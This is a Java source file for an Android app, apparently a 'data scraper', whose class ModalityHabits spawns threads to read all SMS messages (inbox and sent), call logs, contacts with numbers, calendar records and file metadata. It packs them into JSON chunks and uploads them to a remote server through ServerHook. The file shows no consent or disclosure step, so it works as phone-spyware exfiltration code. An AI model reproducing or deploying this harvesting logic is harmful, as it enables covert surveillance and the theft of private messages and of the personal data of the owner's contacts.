package com.example.alex.datascraper;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;

import java.util.ArrayList;
import java.util.List;

/**
 * Class for scraping data from a smart phone. Creates seperate threads for scraping data into chunks
 * and sending it to a server. Also tracks which threads are still running.
 */

public class ModalityHabits extends AppCompatActivity {

    // approximate chunk size of data to send
    // must send complete json objects so usually more characters will send
    // MEASURED IN CHARACTERS NOT BITS OR BYTES
    private final int chunkSize = 500;

    // for tracking progession on data sending
    public static int activeThreads = 0; // number of threads currently sending data
    private boolean dispatchDone = false; // true when thread dispatcher has dispatched all available threads

    // True when done sending data
    public static boolean DONE = false;

    // synchronized method for changing activeThreads to avoid race conditions
    // INPUT - d - amount to change activeThreads by (usually 1 or -1)
    private synchronized void changeActiveThreads(int d) {
        activeThreads += d;
        checkIfDone();
    }

    // synchronized method for changing dispatchDone to avoid race conditions (maybe not needed?)
    public synchronized void dispatchDone(){
        dispatchDone = true;
        checkIfDone();
        Log.d("MYAPP", "DISPATCH DONE");
    }

    // synchronized method for checking both activeThreads and dispatchDone to see if all sending is finished
    public synchronized void checkIfDone(){
        // when all threads that will be started have been started and also finished, mark as done sending
        // and send the END message to the server
        if(activeThreads <= 0 && dispatchDone){
            ServerHook.sendToServer("debug", "END");
            Log.d("MYAPP", "ALL DONE");
            DONE = true;
        }
    }

    // Launches a new data scraping thread
    // INPUT - mContext - the context for scraping the data
    // INPUT - habit - a string representing the type of data being scraped
    public void getHabit(Context mContext, String habit){
        // add to number of threads running
        changeActiveThreads(1);
        // start a new thread
        Thread t = new Thread(new HabitsRunner(mContext, habit));
        t.start();
    }

    // Gateway for starting modality scraping threads
    private class HabitsRunner implements Runnable{

        private Context mContext; //context for scraping the data
        private String habit; // string representing the type of data being scraped

        // store these values for running
        public HabitsRunner(Context c, String h){
            mContext = c;
            habit = h;
        }

        // send the appropriate data when the thread is started
        @Override
        public void run(){
            try {
                switch(habit){
                    case "texts":
                        sendTexts();
                        break;
                    case "calls":
                        sendCalls();
                        break;
                    case "contacts":
                        sendContacts();
                        break;
                    case "calendar":
                        sendCalendar();
                        break;
                    case "files":
                        sendFiles();
                        break;
                    default:
                        Log.d("NOTFOUND", habit);
                }
                Log.d("MYAPP", habit + " DONE");
            }
            catch(Exception e){
                Log.d("ERROR", e.getMessage());
            }
            finally{
                // afterwards, remove an active thread and then check if all threads have finished
                changeActiveThreads(-1);
                checkIfDone();
            }
        }

        /*
        The rest of this runnable class is just the functions for scraping each type of data
         */

        /* sends all saved texts */
        private void sendTexts(){
            List<String> texts = new ArrayList<>();

            // inbox cursor
            Cursor cursor = mContext.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);

            String colName, val;
            String msgData = "[";

            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {
                    msgData += "{";

                    for(int idx=0;idx<cursor.getColumnCount();idx++)
                    {
                        colName = cursor.getColumnName(idx);
                        val = cursor.getString(idx);

                        if(val == null || val.equals("")){
                            msgData += "\"" + colName + "\":\"null\",";
                        }
                        else{
                            colName = colName.replace("\"", "'");
                            colName = colName.replace("\n", " ");

                            val = val.replace("\"", "'");
                            val = val.replace("\n", " ");

                            msgData += "\""
                                    + colName
                                    + "\":\""
                                    + val
                                    + "\",";
                        }
                    }

                    msgData = msgData.substring(0, msgData.length()-1);
                    msgData += "},";

                    if(msgData.length() > chunkSize){
                        msgData = msgData.substring(0, msgData.length()-1);
                        msgData += "]";
                        ServerHook.sendToServer("text", msgData);
                        msgData = "[";
                    }
                    //ServerHook.sendToServer("text",msgData);
                } while (cursor.moveToNext());
            } else {
                System.out.println("No messages found");
            }
            cursor.close();

            // sent cursor
            cursor = mContext.getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {
                    msgData += "{";
                    for(int idx=0;idx<cursor.getColumnCount();idx++)
                    {
                        colName = cursor.getColumnName(idx);
                        val = cursor.getString(idx);

                        if(val == null || val.equals("")){
                            msgData += "\"" + colName + "\":\"null\",";
                        }
                        else{
                            colName = colName.replace("\"", "'");
                            colName = colName.replace("\n", " ");

                            val = val.replace("\"", "'");
                            val = val.replace("\n", " ");

                            msgData += "\""
                                    + colName
                                    + "\":\""
                                    + val
                                    + "\",";
                        }

                    }

                    msgData = msgData.substring(0, msgData.length()-1);
                    msgData += "},";
                    if(msgData.length() > chunkSize){
                        msgData = msgData.substring(0, msgData.length()-1);
                        msgData += "]";
                        ServerHook.sendToServer("text", msgData);
                        msgData = "[";
                    }
                    //ServerHook.sendToServer("text",msgData);
                } while (cursor.moveToNext());
            } else {
                System.out.println("No messages found");
            }
            cursor.close();
            if(msgData.length() > 1){
                msgData = msgData.substring(0, msgData.length()-1);
                msgData += "]";
                ServerHook.sendToServer("text", msgData);
            }

        }

        /* sends all saved call logs */
        private void sendCalls(){
            // inbox cursor
            Cursor cursor = mContext.getContentResolver().query(Uri.parse("content://call_log/calls"), null, null, null, null);

            String colName, val;
            String msgData = "[";

            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {
                    msgData += "{";
                    for(int idx=0;idx<cursor.getColumnCount();idx++)
                    {
                        colName = cursor.getColumnName(idx);
                        val = cursor.getString(idx);
                        if(val == null || val.equals("")){
                            msgData += "\"" + colName + "\":\"null\",";
                        }
                        else{
                            colName = colName.replace("\"", "'");
                            colName = colName.replace("\n", " ");

                            val = val.replace("\"", "'");
                            val = val.replace("\n", " ");

                            msgData += "\""
                                    + colName
                                    + "\":\""
                                    + val
                                    + "\",";
                        }

                    }
                    msgData = msgData.substring(0, msgData.length()-1);
                    msgData += "},";
                    if(msgData.length() > chunkSize){
                        msgData = msgData.substring(0, msgData.length()-1);
                        msgData += "]";
                        ServerHook.sendToServer("log", msgData);
                        msgData = "[";
                    }

                } while (cursor.moveToNext());
            } else {
                System.out.println("No messages found");
            }
            cursor.close();
            if(msgData.length() > 1){
                msgData = msgData.substring(0, msgData.length()-1);
                msgData += "]";
                ServerHook.sendToServer("log", msgData);
            }
        }

        /* sends all saved contacts */
        private void sendContacts(){
            ContentResolver cr = mContext.getContentResolver();
            Cursor phone = cr.query(ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null);
            if(phone == null){
                return;
            }
            Cursor conCursor;
            String id, name, number;
            String msgData = "[";
            while(phone != null && phone.moveToNext()){
                name = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                name = name.replace("\"", "'");
                name = name.replace("\n", " ");
                id = phone.getString(phone.getColumnIndex(ContactsContract.Contacts._ID));
                msgData += "{";
                msgData += "\"name\":\"" + name + "\",";

                if(phone.getInt(phone.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0){
                    conCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id},
                            null);
                    while(conCursor.moveToNext()){
                        number = conCursor.getString(conCursor.getColumnIndex((ContactsContract.CommonDataKinds.Phone.NUMBER)));
                        msgData += "\"number\":\"" + number + "\",";
                    }
                    conCursor.close();
                }
                msgData = msgData.substring(0, msgData.length()-1);
                msgData += "},";
                if(msgData.length() > chunkSize){
                    msgData = msgData.substring(0, msgData.length()-1);
                    msgData += "]";
                    ServerHook.sendToServer("contact", msgData);
                    msgData = "[";
                }
            }
            phone.close();
            if(msgData.length() > 1){
                msgData = msgData.substring(0, msgData.length()-1);
                msgData += "]";
                ServerHook.sendToServer("contact", msgData);
            }
        }

        /* sends all saved calendar events */
        private void sendCalendar(){
            String msgData = "[";
            // inbox cursor
            Cursor cursor = mContext.getContentResolver().query(Uri.parse("content://com.android.calendar/calendars"), null, null, null, null);

            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {
                    String colName, val;
                    msgData += "{";
                    for(int idx=0;idx<cursor.getColumnCount();idx++)
                    {
                        colName = cursor.getColumnName(idx);
                        val = cursor.getString(idx);
                        if(val == null || val.equals("")){
                            msgData += "\"" + colName + "\":\"null\",";
                        }
                        else{
                            colName = colName.replace("\"", "'");
                            colName = colName.replace("\n", " ");

                            val = val.replace("\"", "'");
                            val = val.replace("\n", " ");

                            msgData += "\""
                                    + colName
                                    + "\":\""
                                    + val
                                    + "\",";
                        }
                    }
                    msgData = msgData.substring(0, msgData.length()-1);
                    msgData += "},";
                    if(msgData.length() > chunkSize){
                        msgData = msgData.substring(0, msgData.length()-1);
                        msgData += "]";
                        ServerHook.sendToServer("calendar", msgData);
                        msgData = "[";
                    }

                } while (cursor.moveToNext());
            } else {
                System.out.println("No events found");
            }
            cursor.close();
            if(msgData.length() > 1){
                msgData = msgData.substring(0, msgData.length()-1);
                msgData += "]";
                ServerHook.sendToServer("calendar", msgData);
            }
        }

        /* sends all saved files */
        private void sendFiles(){
            String msgData = "[";

            // inbox cursor
            Cursor cursor = mContext.getContentResolver().query(Uri.parse("content://media/external/file/"), null, null, null, null);

            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {
                    String colName, val;
                    msgData += "{";
                    for(int idx=0;idx<cursor.getColumnCount();idx++)
                    {
                        colName = cursor.getColumnName(idx);
                        val = cursor.getString(idx);
                        if(val == null || val.equals("")){
                            msgData += "\"" + colName + "\":\"null\",";
                        }
                        else{
                            colName = colName.replace("\"", "'");
                            colName = colName.replace("\n", " ");

                            val = val.replace("\"", "'");
                            val = val.replace("\n", " ");

                            msgData += "\""
                                    + colName
                                    + "\":\""
                                    + val
                                    + "\",";
                        }
                    }
                    msgData = msgData.substring(0, msgData.length()-1);
                    msgData += "},";
                    if(msgData.length() > chunkSize){
                        msgData = msgData.substring(0, msgData.length()-1);
                        msgData += "]";
                        ServerHook.sendToServer("file", msgData);
                        msgData = "[";
                    }
                } while (cursor.moveToNext());
            } else {
                System.out.println("No events found");
            }
            cursor.close();
            if(msgData.length() > 1){
                msgData = msgData.substring(0, msgData.length()-1);
                msgData += "]";
                ServerHook.sendToServer("file", msgData);
            }
        }
    }

}
